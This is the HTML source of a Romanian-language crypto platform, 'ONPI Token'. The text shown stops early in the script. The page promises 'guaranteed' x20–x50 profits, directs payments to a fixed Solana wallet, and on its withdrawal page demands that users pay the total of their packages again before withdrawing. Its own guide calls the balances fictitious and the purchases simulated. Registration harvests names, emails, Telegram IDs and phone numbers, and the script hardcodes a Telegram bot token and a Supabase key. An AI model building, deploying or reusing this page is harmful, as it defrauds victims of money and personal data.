<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ONPI Token</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <style>
    :root {
      --bg: #0b0e11;
      --card: #1e2329;
      --text: #e6e6e6;
      --gray: #9ca3af;
      --primary: #f0b90b;
      --primary-dark: #c99a0b;
      --accent: #f6465d;
      --green: #02c076;
      --border: #2a2e36;
      --success: #02c076;
      --error: #f6465d;
      --card-gradient: linear-gradient(135deg, #1e2329, #171b21);
    }

    * { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      background: var(--card-gradient);
      border-radius: 16px;
      padding: 32px 24px;
      width: 100%;
      max-width: 480px;
      border: 1px solid var(--border);
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      margin: auto;
    }

    h1 {
      font-family: 'Orbitron', sans-serif;
      text-align: center;
      color: var(--primary);
      font-size: 2.2rem;
      margin-bottom: 1.5rem;
    }

    .subtitle {
      text-align: center;
      color: var(--gray);
      font-size: 1.05rem;
      margin-bottom: 2rem;
    }

    .form-group {
      margin-bottom: 1.5rem;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      color: var(--primary);
      font-weight: 600;
    }

    input {
      width: 100%;
      padding: 14px 40px 14px 16px;
      border: 1px solid var(--border);
      border-radius: 12px;
      background: #11151b;
      color: white;
      font-size: 1rem;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(240,185,11,0.3);
    }

    input::placeholder { color: var(--gray); }

    .toggle-password {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 1.3rem;
      color: var(--gray);
    }

    button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      font-size: 1.2rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 1rem;
      transition: all 0.2s;
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    button:not(.logout-btn):not(.btn-register):not([style*="background"]), 
    .dashboard-btn:not(.logout-btn),
    .withdraw-btn,
    .package-card .btn-select:not(:disabled),
    .btn-login,
    .btn-telegram,
    .wallet-btn {
      background: var(--primary) !important;
      color: #000 !important;
    }

    button:not(.logout-btn):not(.btn-register):not([style*="background"]):hover:not(:disabled), 
    .dashboard-btn:not(.logout-btn):hover:not(:disabled),
    .withdraw-btn:hover:not(:disabled),
    .package-card .btn-select:not(:disabled):hover,
    .btn-login:hover,
    .btn-telegram:hover,
    .wallet-btn:hover {
      background: var(--primary-dark) !important;
      transform: translateY(-2px);
    }

    .btn-register {
      background: transparent;
      border: 2px solid var(--primary);
      color: var(--primary);
    }

    .logout-btn {
      background: var(--error);
      color: white;
      grid-column: 1 / -1;
    }

    .status {
      margin-top: 1.5rem;
      padding: 14px;
      border-radius: 12px;
      text-align: center;
      font-weight: 600;
      display: none;
    }

    .success { background: rgba(2,192,118,0.2); color: var(--success); }
    .error   { background: rgba(246,70,93,0.2); color: var(--error); }

    .hidden { display: none !important; }

    .sold-balance {
      text-align: center;
      font-size: 2.8rem;
      font-weight: 800;
      color: white;
      margin: 2rem 0;
      padding: 20px;
      border-radius: 16px;
      background: rgba(15,18,23,0.8);
      border: 1px solid var(--primary);
    }

    .sold-balance .usd {
      color: var(--primary);
      font-size: 3.2rem;
    }

    .sold-balance .tokens {
      display: block;
      font-size: 1.4rem;
      color: var(--gray);
      margin-top: 0.5rem;
    }

    .dashboard-actions {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1rem;
      margin: 2rem 0;
    }

    .profile-section, .packages-page {
      background: rgba(30, 35, 41, 0.8);
      padding: 24px;
      border-radius: 16px;
      margin-top: 1.5rem;
      border: 1px solid var(--border);
    }

    .package-list {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }

    .package-card {
      background: rgba(30, 35, 41, 0.6);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 20px;
      transition: all 0.3s;
      position: relative;
    }

    .package-card.expanded {
      margin-bottom: 140px;
    }

    .package-card:hover {
      border-color: var(--primary);
      box-shadow: 0 0 20px rgba(240,185,11,0.2);
      transform: translateY(-4px);
    }

    .package-card h3 {
      color: var(--primary);
      font-size: 1.6rem;
      margin-bottom: 0.5rem;
    }

    .package-card .price {
      font-size: 2.2rem;
      font-weight: 700;
      color: white;
    }

    .package-card .tokens {
      font-size: 1.3rem;
      color: var(--green);
      margin: 0.5rem 0;
    }

    .package-card .profit {
      font-size: 1.1rem;
      color: var(--gray);
    }

    .package-card .btn-select {
      background: var(--primary);
      color: #000;
      margin-top: 1rem;
      padding: 12px;
      font-size: 1.1rem;
      width: 100%;
    }

    .package-card .btn-select:disabled {
      background: #4a5568 !important;
      color: #cbd5e0 !important;
      cursor: not-allowed;
    }

    .dropdown-menu {
      position: relative;
      margin-top: 1rem;
      background: var(--card);
      border: 1px solid var(--primary);
      border-radius: 8px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.5);
      overflow: hidden;
    }

    .dropdown-menu button {
      background: var(--primary);
      color: #000;
      border: none;
      padding: 14px;
      font-size: 1.1rem;
      cursor: pointer;
      width: 100%;
      text-align: center;
    }

    .dropdown-menu button:hover {
      background: var(--primary-dark);
    }

    .wallet-message {
      background: rgba(240,185,11,0.1);
      border: 1px solid var(--primary);
      border-radius: 12px;
      padding: 24px 20px;
      margin: 2rem 0;
      text-align: center;
    }

    .wallet-address-btn {
      background: var(--primary);
      color: #000;
      border: none;
      border-radius: 10px;
      padding: 16px 12px;
      font-size: 1.25rem;
      text-align: center;
      cursor: pointer;
      margin: 1rem auto;
      max-width: 100%;
      word-break: break-all;
      overflow-wrap: break-word;
      transition: background 0.2s;
    }

    .wallet-address-btn:hover {
      background: var(--primary-dark);
    }

    @media (max-width: 480px) {
      .container { padding: 24px 16px; }
      h1 { font-size: 1.9rem; }
      .sold-balance { font-size: 2.2rem; }
      .sold-balance .usd { font-size: 2.6rem; }
      .wallet-address-btn { font-size: 1.15rem; }
    }

    .dashboard-btn, .withdraw-btn, .stake-btn {
      font-size: 1.05rem;
      padding: 14px 20px;
      border-radius: 12px;
      transition: all 0.25s ease;
    }

    .package-card, .stake-card {
      padding: 18px;
      border-radius: 14px;
    }

    .package-card h3, .stake-card h3 {
      font-size: 1.55rem;
    }

    .package-card .price, .stake-card .price {
      font-size: 2.1rem;
    }

    .package-card .tokens, .stake-card .tokens {
      font-size: 1.25rem;
    }
  </style>
</head>
<body>

<!-- PAGINA DE LOGIN -->
<div class="container" id="loginPage">
  <h1>ONPI Token</h1>
  <p class="subtitle">ConecteazÄƒ-te pentru a continua</p>

  <form id="loginForm">
    <div class="form-group">
      <label for="loginCont">Cont (Username)</label>
      <input type="text" id="loginCont" required placeholder="numele_tÄƒu">
    </div>

    <div class="form-group password-group">
      <label for="loginParola">ParolÄƒ</label>
      <input type="password" id="loginParola" required minlength="6">
      <span class="toggle-password" onclick="togglePassword('loginParola')">ğŸ‘</span>
    </div>

    <button type="submit" class="btn-login">Login</button>
  </form>

  <button class="btn-register" onclick="switchToRegister()">ÃnregistreazÄƒ-te</button>

  <div id="loginStatus" class="status"></div>
</div>

<!-- PAGINA DE ÃNREGISTRARE -->
<div class="container hidden" id="registerPage">
  <h1>ONPI Token</h1>
  <p class="subtitle">CreeazÄƒ-È›i contul pentru a continua.</p>

  <form id="registerForm">
    <div class="form-group">
      <label for="nume">Nume complet</label>
      <input type="text" id="nume" required placeholder="Ion Popescu" minlength="3">
    </div>

    <div class="form-group">
      <label for="cont">Cont (Username)</label>
      <input type="text" id="cont" required placeholder="numele_tÄƒu (doar litere mici, cifre, ._-)" minlength="4">
    </div>

    <div class="form-group password-group">
      <label for="parola">ParolÄƒ</label>
      <input type="password" id="parola" required minlength="6" placeholder="Minimum 6 caractere">
      <span class="toggle-password" onclick="togglePassword('parola')">ğŸ‘</span>
    </div>

    <div class="form-group password-group">
      <label for="confirmParola">ConfirmÄƒ parolÄƒ</label>
      <input type="password" id="confirmParola" required minlength="6" placeholder="Reintrodu parolÄƒ">
      <span class="toggle-password" onclick="togglePassword('confirmParola')">ğŸ‘</span>
    </div>

    <div class="form-group">
      <label for="email">AdresÄƒ de email</label>
      <input type="email" id="email" required placeholder="exemplu@gmail.com">
    </div>

    <div class="form-group">
      <label for="telegram">ID Telegram</label>
      <input type="text" id="telegram" required placeholder="@numele_tÄƒu">
    </div>

    <div class="form-group">
      <label for="telefon">NumÄƒr de telefon</label>
      <input type="tel" id="telefon" required placeholder="+40 712 345 678">
    </div>

    <div class="terms">
      Prin apÄƒsarea butonului confirm cÄƒ accept termenii È™i politica de confidenÈ›ialitate.
    </div>

    <button type="submit">ÃnregistreazÄƒ-mÄƒ</button>
  </form>

  <button class="switch-btn" onclick="switchToLogin()">Am deja cont? â†’ Login</button>

  <div id="status" class="status"></div>
</div>

<!-- PAGINA DE DASHBOARD -->
<div class="container hidden" id="dashboardPage">
  <h1 class="dashboard-welcome">Dashboard ONPI</h1>

  <div class="sold-balance">
    <span class="usd" id="dashSoldValue">0</span> $
    <span class="tokens">Sold ONPI: <span id="dashSold">0</span></span>
  </div>

  <div class="sold-balance" style="margin-top:1rem; border-color:var(--green);">
    <span style="color:var(--green);">Stake activ: <span id="dashStakeSold">0</span> ONPI</span>
  </div>

  <button class="withdraw-btn" onclick="goToWithdrawal()">Retragere</button>

  <div class="dashboard-actions">
    <button class="dashboard-btn profile-btn" onclick="openProfile()">ğŸ‘¤ Profil</button>
    <button class="dashboard-btn password-btn" onclick="changePassword()">ğŸ” SchimbÄƒ parolÄƒ</button>
    <button id="btnPackages" class="dashboard-btn packages-btn" onclick="openPackages(false)">ğŸ“¦ Pachete</button>
    <button id="btnChangePackage" class="dashboard-btn change-package-btn" onclick="openPackages(true)">ğŸ”„ AdaugÄƒ pachet</button>
    <button class="dashboard-btn stake-btn" onclick="openStake()">ğŸ’° Stake ONPI</button>
    <button class="dashboard-btn instructions-btn" onclick="openInstructions()">ğŸ“– InstrucÈ›iuni</button>
    <button class="dashboard-btn logout-btn" onclick="logout()">ğŸšª Deconectare</button>
  </div>

  <div style="margin-top:2rem; padding:20px; background:rgba(30,35,41,0.8); border-radius:16px; border:1px solid var(--primary); height:320px;">
    <h3 style="text-align:center; color:var(--primary); margin-bottom:1rem;">EvoluÈ›ie preÈ› ONPI (ultimele 24h)</h3>
    <canvas id="priceChart" height="220"></canvas>
  </div>

  <div id="dashboardStatus" class="status"></div>
</div>

<!-- PAGINA PROFIL -->
<div class="container hidden" id="profilePage">
  <h1>Profilul meu</h1>

  <div class="profile-section">
    <p><strong>Nume complet:</strong> <span id="dashNume">â€”</span></p>
    <p><strong>Cont (Username):</strong> <span id="dashCont">â€”</span></p>
    <p><strong>Email:</strong> <span id="dashEmail">â€”</span></p>
    <p><strong>Telegram ID:</strong> <span id="dashTelegram">â€”</span></p>
    <p><strong>Telefon:</strong> <span id="dashTelefon">â€”</span></p>
    <p><strong>Data Ã®nregistrÄƒrii:</strong> <span id="dashDataInregistrare">â€”</span></p>
    <p><strong>Sold ONPI:</strong> <span id="dashSoldPersonal">0</span> ONPI</p>
    <p><strong>Sold Stake:</strong> <span id="dashStakePersonal">0</span> ONPI</p>
    <p><strong>Pachete cumpÄƒrate:</strong> <span id="dashPachete">0</span></p>
    <p><strong>Pachet activ:</strong> <span id="dashActivePackage">â€”</span></p>
    <p><strong>Status cont:</strong> <span id="dashStatus">Activ</span></p>
    <p><strong>Adresa wallet Solana:</strong> <span id="dashWallet">â€” (nu ai adÄƒugat Ã®ncÄƒ)</span></p>
  </div>

  <div style="margin-top:2rem;">
    <button onclick="addWallet()" style="background: var(--primary); color: black; padding: 16px; font-size: 1.2rem;">
      AdaugÄƒ / ModificÄƒ wallet Solana
    </button>
  </div>

  <button onclick="switchToDashboard()" style="margin-top:1.5rem;">Ãnapoi la dashboard</button>
</div>

<!-- PAGINA PACHETE -->
<div class="container hidden" id="packagesPage">
  <h1>Pachete disponibile</h1>
  <p class="subtitle">Alege pachetul potrivit pentru tine</p>

  <div class="package-list">
    <div class="package-card" id="card1">
      <h3>Basic</h3>
      <div class="price">50$</div>
      <div class="tokens">7.500.000 ONPI (\~<span id="solEq50">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('card1')">SelecteazÄƒ</button>
        <div class="dropdown-menu" id="dropdown1">
          <button onclick="buyPackage('50')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="card2">
      <h3>Standard</h3>
      <div class="price">100$</div>
      <div class="tokens">15.000.000 ONPI (\~<span id="solEq100">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('card2')">SelecteazÄƒ</button>
        <div class="dropdown-menu" id="dropdown2">
          <button onclick="buyPackage('100')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="card3">
      <h3>Premium</h3>
      <div class="price">200$</div>
      <div class="tokens">30.000.000 ONPI (\~<span id="solEq200">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('card3')">SelecteazÄƒ</button>
        <div class="dropdown-menu" id="dropdown3">
          <button onclick="buyPackage('200')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="card4">
      <h3>Elite</h3>
      <div class="price">500$</div>
      <div class="tokens">60.000.000 ONPI (\~<span id="solEq500">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('card4')">SelecteazÄƒ</button>
        <div class="dropdown-menu" id="dropdown4">
          <button onclick="buyPackage('500')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>
  </div>

  <button onclick="switchToDashboard()" style="margin-top:2rem;">Ãnapoi la dashboard</button>
</div>

<!-- PAGINA UPGRADE / ADAUGÄ‚ PACHET -->
<div class="container hidden" id="upgradePage">
  <h1>Upgrade / AdaugÄƒ pachet</h1>
  <p class="subtitle">Alege un pachet superior celui actual</p>

  <div class="package-list">
    <div class="package-card" id="up-card1">
      <h3>Basic</h3>
      <div class="price">50$</div>
      <div class="tokens">7.500.000 ONPI (\~<span id="solEqUp50">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('up-card1')">Upgrade</button>
        <div class="dropdown-menu" id="up-dropdown1">
          <button onclick="buyPackage('50')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="up-card2">
      <h3>Standard</h3>
      <div class="price">100$</div>
      <div class="tokens">15.000.000 ONPI (\~<span id="solEqUp100">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('up-card2')">Upgrade</button>
        <div class="dropdown-menu" id="up-dropdown2">
          <button onclick="buyPackage('100')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="up-card3">
      <h3>Premium</h3>
      <div class="price">200$</div>
      <div class="tokens">30.000.000 ONPI (\~<span id="solEqUp200">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('up-card3')">Upgrade</button>
        <div class="dropdown-menu" id="up-dropdown3">
          <button onclick="buyPackage('200')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>

    <div class="package-card" id="up-card4">
      <h3>Elite</h3>
      <div class="price">500$</div>
      <div class="tokens">60.000.000 ONPI (\~<span id="solEqUp500">calculÃ¢nd...</span> SOL)</div>
      <div class="profit">Profit garantat x20 â€“ x50</div>
      <div class="dropdown-wrapper">
        <button class="btn-select" onclick="toggleDropdown('up-card4')">Upgrade</button>
        <div class="dropdown-menu" id="up-dropdown4">
          <button onclick="buyPackage('500')">AchiziÈ›ioneazÄƒ direct Ã®n SOL</button>
        </div>
      </div>
    </div>
  </div>

  <button onclick="switchToDashboard()" style="margin-top:2rem;">Ãnapoi la dashboard</button>
</div>

<!-- PAGINA ACHIZIÈšIE -->
<div class="container hidden" id="purchasePage">
  <h1>FinalizeazÄƒ achiziÈ›ia</h1>

  <div class="wallet-message">
    <p class="timer-message"><strong>Trimite suma corespunzÄƒtoare cÄƒtre adresa wallet de mai jos.</strong></p>
    <p style="margin: 1.2rem 0 0.8rem;">AdresÄƒ wallet Solana (apasÄƒ pentru copiere):</p>
    <button class="wallet-address-btn" onclick="copyWallet()">
      B9S74FCa1Ac2AY8osHDK5Hu3PB9m2RovxGMq52a5rbfP
    </button>
    <p style="margin-top:1.5rem; font-size:1rem; color:var(--gray);">DupÄƒ trimitere, aÈ™teaptÄƒ confirmarea manualÄƒ a echipei.</p>
  </div>

  <button class="btn-register" onclick="openPackages(false)" style="margin-top:1.5rem;">
    Ãnapoi la pachete
  </button>
</div>

<!-- PAGINA RETRAGERE -->
<div class="container hidden" id="withdrawalPage">
  <h1>Retragere ONPI</h1>
  <p class="subtitle">Cerere de retragere din sold</p>

  <div class="wallet-message">
    <p><strong>Sold disponibil:</strong> <span id="withdrawalBalance">0</span> ONPI</p>

    <p><strong>Adresa wallet Ã®nregistratÄƒ:</strong></p>
    <button class="wallet-address-btn" onclick="copyWalletPersonal()" id="personalWalletDisplay">
      â€” (nu ai adÄƒugat wallet Ã®ncÄƒ)
    </button>

    <div class="form-group" style="margin-top:1.5rem;">
      <label for="withdrawalAmount">SumÄƒ pe care vrei sÄƒ o retragi (ONPI):</label>
      <input type="number" id="withdrawalAmount" min="1" step="1" placeholder="Introdu suma" style="margin-top:0.5rem;">
    </div>

    <div id="minWithdrawalInfo" style="margin-top: 1rem; padding: 12px; background: rgba(240,185,11,0.1); border: 1px solid var(--primary); border-radius: 8px; font-size: 0.95rem;">
      <strong>Sume minime permise de retragere (per pachet):</strong><br>
      <div id="minAmountsList"></div>
    </div>

    <button id="submitWithdrawalBtn" onclick="submitWithdrawalRequest()" style="margin-top:1.5rem;">
      Retragere
    </button>

    <p style="margin-top:1.5rem; color:var(--gray); font-size:0.9rem;">
      Cererea va fi procesatÄƒ manual. VerificÄƒ adresa È™i suma Ã®nainte de trimitere.
    </p>
  </div>

  <button class="btn-register" onclick="switchToDashboard()" style="margin-top:2rem;">
    Ãnapoi la dashboard
  </button>
</div>

<!-- PAGINA DE INSTRUCÈšIUNI PENTRU RETRAGERE -->
<div class="container hidden" id="instructionsPage">
  <h1>InstrucÈ›iuni retragere ONPI</h1>
  <p class="subtitle">Te rugÄƒm sÄƒ citeÈ™ti cu atenÈ›ie Ã®nainte de a confirma cererea</p>

  <div style="padding: 20px; background: rgba(30,35,41,0.8); border-radius: 12px; border: 1px solid var(--primary); margin-bottom: 2rem; line-height: 1.8;">
    <ol style="font-size: 1.1rem; color: var(--text);">
      <li><strong>Cererea ta va fi procesatÄƒ</strong> de echipa ONPI.</li>
      <li><strong>Timp de procesare:</strong> Maxim 12 ore (de obicei mult mai rapid).</li>
      <li>
        <strong>Verificare obligatorie:</strong> AsigurÄƒ-te cÄƒ adresa wallet este corectÄƒ È™i cÄƒ suma cerutÄƒ este disponibilÄƒ Ã®n sold.<br><br>
        <strong style="color: var(--accent); font-size: 1.15rem;">
          PlÄƒteÈ™te totalul pachetelor achiziÈ›ionate (pachet iniÈ›ial + toate upgrade-urile) cÄƒtre adresa wallet oficialÄƒ (apasÄƒ pentru copiere):
        </strong><br>
        <button class="wallet-address-btn" onclick="copyWallet()" style="margin: 8px 0;">
          B9S74FCa1Ac2AY8osHDK5Hu3PB9m2RovxGMq52a5rbfP
        </button>
        <span style="color: var(--gray); font-size: 0.95rem;">
          (ApasÄƒ butonul de mai sus pentru a copia adresa rapid)
        </span>
      </li>
      <li><strong>Confirmare:</strong> Vei primi un mesaj cÃ¢nd retragerea este aprobatÄƒ È™i trimisÄƒ.</li>
      <li><strong>Suport:</strong> DacÄƒ ai Ã®ntrebÄƒri sau probleme, contacteazÄƒ-ne.</li>
    </ol>
  </div>

  <button onclick="submitWithdrawalRequest()" style="background: var(--success); color: white; font-weight: bold; margin-top: 1rem; padding: 18px; font-size: 1.2rem;">
    Am Ã®nÈ›eles â†’ Trimite cererea acum
  </button>

  <button onclick="switchToDashboard()" style="margin-top: 1.5rem; background: var(--gray);">
    Ãnapoi la dashboard (renunÈ›Äƒ la cerere)
  </button>
</div>

<!-- PAGINA INSTRUCÈšIUNI GENERALE -->
<div class="container hidden" id="instructionsGeneralPage">
  <h1>InstrucÈ›iuni ONPI Token</h1>
  <p class="subtitle">Ghid complet â€“ Cum funcÈ›ioneazÄƒ totul</p>

  <div class="profile-section" style="line-height: 1.7; font-size: 1.05rem;">
    <h3 style="color: var(--primary); margin: 1.8rem 0 0.8rem;">1. Cum cumperi pachete ONPI?</h3>
    <p>â€¢ Accesezi secÈ›iunea â€Pacheteâ€ sau â€AdaugÄƒ pachetâ€ din dashboard.<br>
       â€¢ Alegi unul dintre pachete (Basic, Standard, Premium, Elite).<br>
       â€¢ ApeÈ™i â€AchiziÈ›ioneazÄƒ direct Ã®n SOLâ€.<br>
       â€¢ ConecteazÄƒ wallet-ul Solana (Phantom / Solflare) cÃ¢nd È›i se cere.<br>
       â€¢ ConfirmÄƒ achiziÈ›ia simulatÄƒ direct Ã®n platformÄƒ.<br>
       â€¢ Soldul ONPI fictiv se adaugÄƒ imediat Ã®n contul tÄƒu.</p>

    <h3 style="color: var(--primary); margin: 2rem 0 0.8rem;">2. Cum faci retragere din sold?</h3>
    <p>â€¢ Mergi la butonul â€Retragereâ€ (doar dacÄƒ ai wallet Ã®nregistrat).<br>
       â€¢ Introdu suma doritÄƒ (trebuie sÄƒ fie una dintre sumele permise â€“ vezi lista afiÈ™atÄƒ).<br>
       â€¢ ApasÄƒ â€Retragereâ€.<br>
       â€¢ DacÄƒ retragi TOT soldul, contul se reseteazÄƒ automat (pachete = 0, buton Pachete activ).<br>
       â€¢ Cererea este procesatÄƒ manual Ã®n maxim 12 ore.</p>

    <h3 style="color: var(--primary); margin: 2rem 0 0.8rem;">3. Cum faci Stake ONPI?</h3>
    <p>â€¢ Mergi la butonul â€Stake ONPIâ€ din dashboard.<br>
       â€¢ Alege perioada (7 zile 12.5%, 30 zile 18.9%, 90 zile 50%).<br>
       â€¢ Introdu suma (minim 50% din sold disponibil).<br>
       â€¢ Suma se blocheazÄƒ temporar È™i nu poate fi retrasÄƒ pÃ¢nÄƒ la finalul perioadei.<br>
       â€¢ DobÃ¢nda se adaugÄƒ zilnic Ã®n sold stake (vizibil Ã®n dashboard).</p>

    <h3 style="color: var(--primary); margin: 2rem 0 0.8rem;">4. Reguli esenÈ›iale</h3>
    <ul style="padding-left: 1.6rem; margin: 1rem 0;">
      <li>Profitul menÈ›ionat (x20 â€“ x50) este estimativ minim si maxim garantat.</li>
      <li>Toate tranzacÈ›iile (cumpÄƒrare È™i retragere) sunt procesate manual de echipÄƒ.</li>
      <li>VerificÄƒ Ã®ntotdeauna adresa wallet de 2â€“3 ori Ã®nainte de a trimite fonduri.</li>
      <li>Nu trimite niciodatÄƒ bani cÄƒtre adrese nesolicitate sau primite privat.</li>
      <li>Pentru suport â†’ contacteazÄƒ-ne prin Telegram sau prin formularul din aplicaÈ›ie.</li>
    </ul>

    <h3 style="color: var(--primary); margin: 2rem 0 0.8rem;">5. SiguranÈ›Äƒ È™i atenÈ›ie</h3>
    <p style="color: var(--accent); font-weight: 600; padding: 12px; background: rgba(246,70,93,0.15); border-radius: 10px; border: 1px solid var(--accent);">
      NiciodatÄƒ nu Ã®mpÄƒrtÄƒÈ™i seed phrase-ul, cheia privatÄƒ sau parola contului tÄƒu cu nimeni!<br>
      Echipa ONPI nu Ã®È›i va cere niciodatÄƒ aceste informaÈ›ii.
    </p>
  </div>

  <button onclick="switchToDashboard()" style="margin-top: 2.5rem; width: 100%; padding: 16px; font-size: 1.15rem;">
    Ãnapoi la Dashboard
  </button>
</div>

<!-- PAGINA STAKE -->
<div class="container hidden" id="stakePage">
  <h1>Stake ONPI</h1>
  <p class="subtitle">BlocheazÄƒ-È›i ONPI pentru dobÃ¢ndÄƒ zilnicÄƒ</p>

  <div class="package-list">
    <div class="package-card">
      <h3>7 zile â€“ 12.5% dobÃ¢ndÄƒ totalÄƒ</h3>
      <div class="price">DobÃ¢ndÄƒ zilnicÄƒ \~1.78%</div>
      <p>Minim 50% din sold disponibil. Suma blocatÄƒ pÃ¢nÄƒ la finalul perioadei.</p>
      <button class="btn-select" onclick="stakeTokens(7)">ActiveazÄƒ stake 7 zile</button>
    </div>

    <div class="package-card">
      <h3>30 zile â€“ 18.9% dobÃ¢ndÄƒ totalÄƒ</h3>
      <div class="price">DobÃ¢ndÄƒ zilnicÄƒ \~0.63%</div>
      <p>Minim 50% din sold disponibil. Suma blocatÄƒ pÃ¢nÄƒ la finalul perioadei.</p>
      <button class="btn-select" onclick="stakeTokens(30)">ActiveazÄƒ stake 30 zile</button>
    </div>

    <div class="package-card">
      <h3>90 zile â€“ 50% dobÃ¢ndÄƒ totalÄƒ</h3>
      <div class="price">DobÃ¢ndÄƒ zilnicÄƒ \~0.555%</div>
      <p>Minim 50% din sold disponibil. Suma blocatÄƒ pÃ¢nÄƒ la finalul perioadei.</p>
      <button class="btn-select" onclick="stakeTokens(90)">ActiveazÄƒ stake 90 zile</button>
    </div>
  </div>

  <button onclick="switchToDashboard()" style="margin-top:2rem;">Ãnapoi la dashboard</button>
</div>

<!-- PAGINA CALCUL DOBÃ‚NDÄ‚ INDIVIDUAL -->
<div class="container hidden" id="interestCalcPage">
  <h1>Calcul dobÃ¢ndÄƒ stake</h1>
  <p class="subtitle">Detalii complete pentru perioada aleasÄƒ</p>

  <div id="interestDetails" style="padding: 15px; background: rgba(240,185,11,0.1); border-radius: 12px;"></div>

  <button onclick="openStake()" style="margin-top:2rem;">Ãnapoi la opÈ›iuni stake</button>
</div>

<script>
// CONSTANTE
const BOT_TOKEN = '7548290162:AAH0P6XOowBMHvKIggPT-pafIg6RDI3Qj-c';
const CHAT_ID   = '5470225717';
const MY_WALLET = 'B9S74FCa1Ac2AY8osHDK5Hu3PB9m2RovxGMq52a5rbfP';

// Supabase Config
const SUPABASE_URL = 'https://tymrdlvydcfbnxfawxqx.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR5bXJkbHZ5ZGNmYm54ZmF3eHF4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEzMjcxMTMsImV4cCI6MjA4NjkwMzExM30.txI8mMkPvVs8SR6rNBcHF8F3z175-4peEJF9-M4a4Os';

const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Mapare valoare â†’ numÄƒr tokeni
const packages = {
  '50':  7500000,
  '100': 15000000,
  '200': 30000000,
  '500': 60000000
};

let upgradeMode = false;

// Elemente DOM principale
const registerForm     = document.getElementById('registerForm');
const loginForm        = document.getElementById('loginForm');
const registerPage     = document.getElementById('registerPage');
const loginPage        = document.getElementById('loginPage');
const dashboardPage    = document.getElementById('dashboardPage');
const profilePage      = document.getElementById('profilePage');
const packagesPage     = document.getElementById('packagesPage');
const upgradePage      = document.getElementById('upgradePage');
const purchasePage     = document.getElementById('purchasePage');
const withdrawalPage   = document.getElementById('withdrawalPage');
const instructionsPage = document.getElementById('instructionsPage');
const instructionsGeneralPage = document.getElementById('instructionsGeneralPage');
const stakePage        = document.getElementById('stakePage');
const interestCalcPage = document.getElementById('interestCalcPage');
const status           = document.getElementById('status');
const loginStatus      = document.getElementById('loginStatus');
const dashboardStatus  = document.getElementById('dashboardStatus');
const dashSold         = document.getElementById('dashSold');
const dashSoldValue    = document.getElementById('dashSoldValue');
const dashNume         = document.getElementById('dashNume');
const dashCont         = document.getElementById('dashCont');
const dashEmail        = document.getElementById('dashEmail');
const dashTelegram     = document.getElementById('dashTelegram');
const dashTelefon      = document.getElementById('dashTelefon');
const dashWallet       = document.getElementById('dashWallet');
const dashSoldPersonal = document.getElementById('dashSoldPersonal');
const dashPachete      = document.getElementById('dashPachete');
const dashActivePackage = document.getElementById('dashActivePackage');
const personalWalletDisplay = document.getElementById('personalWalletDisplay');
const withdrawalBalance = document.getElementById('withdrawalBalance');
const withdrawalAmount  = document.getElementById('withdrawalAmount');

